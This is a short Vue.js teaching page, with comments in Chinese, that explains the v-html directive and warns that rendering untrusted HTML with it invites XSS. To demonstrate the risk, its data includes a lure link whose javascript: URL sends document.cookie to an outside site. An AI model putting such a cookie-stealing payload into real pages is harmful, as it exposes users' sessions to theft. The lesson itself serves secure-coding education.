<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="../JS/vue.js">
			
		</script>
	</head>
	<body>
        <!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
		<!-- 准备好一个容器 -->
		<div id="box">
			<h1>hello,{{name}}</h1>
            <div v-html="str"></div>
            <div v-html="str2"></div>
		</div>
		<script type="text/javascript">
			 Vue.config.productionTip=false  //阻止Vue在启动时产生提示          
			// 创建Vue实例对象
			const vm = new Vue({
				el:'#box',
				data:{
					name:'karry',
                    str:'<h3>hello,karry</h3>',
                    str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>快点来点我！！！</a>'
				}
				
			})
		</script>
	</body>
</html>
